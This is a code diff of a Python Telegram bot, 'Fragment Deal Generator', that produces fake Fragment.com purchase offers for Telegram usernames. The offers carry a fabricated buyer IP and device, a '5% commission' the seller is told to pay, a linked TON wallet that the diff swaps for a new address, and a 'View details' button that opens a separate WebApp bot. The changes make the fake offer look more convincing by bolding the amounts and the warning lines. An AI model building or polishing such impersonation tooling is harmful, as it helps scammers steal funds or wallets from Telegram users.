@@ -6,7 +6,7 @@ import asyncio
 import threading
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from urllib.parse import urlparse, parse_qs
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, MessageEntity
 from telegram.ext import Application, CommandHandler, ContextTypes
 
 # Configuration
@@ -15,7 +15,7 @@ FIXED_CHAT_ID = 511758924
 PORT = int(os.getenv('PORT', 10000))
 WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"
 
-print(f"🤖 Fragment Deal Generator v3.2 - WEBHOOK FIXED")
+print(f"🤖 Fragment Deal Generator v3.3 - WEBHOOK FIXED")
 print(f"🔑 Token: ✅")
 print(f"🎯 Chat ID: {FIXED_CHAT_ID}")
 print(f"🌐 Port: {PORT}")
@@ -46,7 +46,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user = update.effective_user
         chat_id = update.effective_chat.id
         
-        message = f"""🤖 **Fragment Deal Generator v3.2**
+        message = f"""🤖 **Fragment Deal Generator v3.3**
 
 Hello {user.first_name}! 👋
 
@@ -76,7 +76,7 @@ Hello {user.first_name}! 👋
             pass
 
 async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Commande /create avec toutes les corrections"""
+    """Commande /create avec formatage en gras"""
     print(f"📥 CREATE command: {context.args}")
     
     try:
@@ -107,7 +107,10 @@ async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         price_usd = price * ton_price
         commission_usd = commission * ton_price
         
-        # Message Fragment avec wallet cliquable et montants corrigés
+        # Nouvelle adresse wallet
+        wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
+        
+        # Message Fragment avec formatage en gras
         fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:
 
 • Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
@@ -118,35 +121,78 @@ Please note that a 5% commission is charged to the seller prior to accepting the
 Additional Information:
 • Device: Safari on macOS  
 • IP Address: 103.56.72.245
-• Wallet: EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U
+• Wallet: {wallet_address}
 
 Important:
 • Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
 • If you choose not to proceed, simply ignore this message."""
         
-        # URL du bouton avec le BON nom de bot
+        # URL du bouton
         button_url = f"https://t.me/BidRequestWebApp_bot/WebApp?startapp={username.lower()}-{price:g}"
         
-        # Bouton avec URL corrigée
+        # Bouton
         keyboard = [[InlineKeyboardButton("View details", url=button_url)]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
-        # Envoi du message avec entités pour le lien wallet
-        wallet_address = "EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U"
+        # Création des entités pour le formatage
+        entities = []
         
+        # 1. Offer Amount en gras
+        offer_text = f"• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)"
+        offer_start = fragment_message.find(offer_text)
+        if offer_start != -1:
+            entities.append(MessageEntity(
+                type=MessageEntity.BOLD,
+                offset=offer_start,
+                length=len(offer_text)
+            ))
+        
+        # 2. Commission en gras
+        commission_text = f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)"
+        commission_start = fragment_message.find(commission_text)
+        if commission_start != -1:
+            entities.append(MessageEntity(
+                type=MessageEntity.BOLD,
+                offset=commission_start,
+                length=len(commission_text)
+            ))
+        
+        # 3. Premier point Important en gras
+        important_text1 = "• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible."
+        important_start1 = fragment_message.find(important_text1)
+        if important_start1 != -1:
+            entities.append(MessageEntity(
+                type=MessageEntity.BOLD,
+                offset=important_start1,
+                length=len(important_text1)
+            ))
+        
+        # 4. Deuxième point Important en gras
+        important_text2 = "• If you choose not to proceed, simply ignore this message."
+        important_start2 = fragment_message.find(important_text2)
+        if important_start2 != -1:
+            entities.append(MessageEntity(
+                type=MessageEntity.BOLD,
+                offset=important_start2,
+                length=len(important_text2)
+            ))
+        
+        # 5. Wallet cliquable
+        wallet_start = fragment_message.find(wallet_address)
+        if wallet_start != -1:
+            entities.append(MessageEntity(
+                type=MessageEntity.TEXT_LINK,
+                offset=wallet_start,
+                length=len(wallet_address),
+                url=f"https://tonviewer.com/{wallet_address}"
+            ))
+        
+        # Envoi du message avec toutes les entités
         await update.message.reply_text(
             fragment_message,
             reply_markup=reply_markup,
             disable_web_page_preview=True,
-            parse_mode=None,  # Pas de Markdown pour éviter les conflits
-            entities=[
-                {
-                    "type": "text_link",
-                    "offset": fragment_message.find(wallet_address),
-                    "length": len(wallet_address),
-                    "url": f"https://tonviewer.com/{wallet_address}"
-                }
-            ] if fragment_message.find(wallet_address) != -1 else None
+            entities=entities
         )
         
         # Message de confirmation
@@ -155,12 +201,14 @@ Important:
             f"Username: @{username}\n"
             f"Price: {price:g} TON (${price_usd:.2f})\n"
             f"TON Price: ${ton_price:.2f}\n"
+            f"Wallet: `{wallet_address}`\n"
             f"Button URL: `{button_url}`",
             parse_mode='Markdown'
         )
         
         print(f"✅ Deal created: @{username} - {price} TON")
         print(f"🔗 Button URL: {button_url}")
+        print(f"💼 Wallet: {wallet_address}")
         
     except Exception as e:
         print(f"❌ CREATE error: {e}")
@@ -190,6 +238,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 • 🧮 5% commission calculation
 • 🔗 Clickable TON wallet
 • 📱 Integrated WebApp button
+• **Bold formatting** for key information
 
 ✅ **Ready to generate Fragment deals!**"""
     
@@ -254,7 +303,7 @@ class WebhookHandler(BaseHTTPRequestHandler):
 </head>
 <body>
     <div class="container">
-        <h1>🤖 Fragment Deal Generator v3.2</h1>
+        <h1>🤖 Fragment Deal Generator v3.3</h1>
         <p class="status">✅ Status: {bot_status}</p>
         <div class="info">
             <p><strong>🔗 Bot:</strong> @BidRequestWebApp_bot</p>
@@ -263,15 +312,17 @@ class WebhookHandler(BaseHTTPRequestHandler):
             <p><strong>🕐 Time:</strong> {time.strftime('%Y-%m-%d %H:%M:%S UTC')}</p>
             <p><strong>💎 Target Chat:</strong> {FIXED_CHAT_ID}</p>
             <p><strong>🔄 Event Loop:</strong> {'Active' if event_loop else 'None'}</p>
+            <p><strong>💼 Wallet:</strong> UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR</p>
         </div>
         <p><strong>Webhook URL:</strong> {WEBHOOK_URL}/{BOT_TOKEN}</p>
         <p>Ready to generate Fragment deals! 🚀</p>
-        <p><strong>Features:</strong></p>
+        <p><strong>Features v3.3:</strong></p>
         <ul>
             <li>✅ TON amounts without "TON" text</li>
-            <li>✅ Clickable wallet link</li>
+            <li>✅ Clickable wallet link (new address)</li>
             <li>✅ Correct WebApp button URL (BidRequestWebApp_bot)</li>
             <li>✅ Real-time TON price</li>
+            <li>✅ <strong>Bold formatting</strong> for offer amounts and important text</li>
         </ul>
     </div>
 </body>
@@ -375,7 +426,7 @@ async def setup_bot():
         print(f"📡 Webhook active: {webhook_info.url}")
         
         bot_status = "RUNNING"
-        print("✅ Bot ready!")
+        print("✅ Bot ready with bold formatting!")
         
         return True
         
@@ -451,7 +502,7 @@ def run_server():
 # ===== MAIN =====
 def main():
     """Point d'entrée principal"""
-    print("🚀 Starting Fragment Deal Generator v3.2...")
+    print("🚀 Starting Fragment Deal Generator v3.3...")
     print("=" * 60)
     
     try:
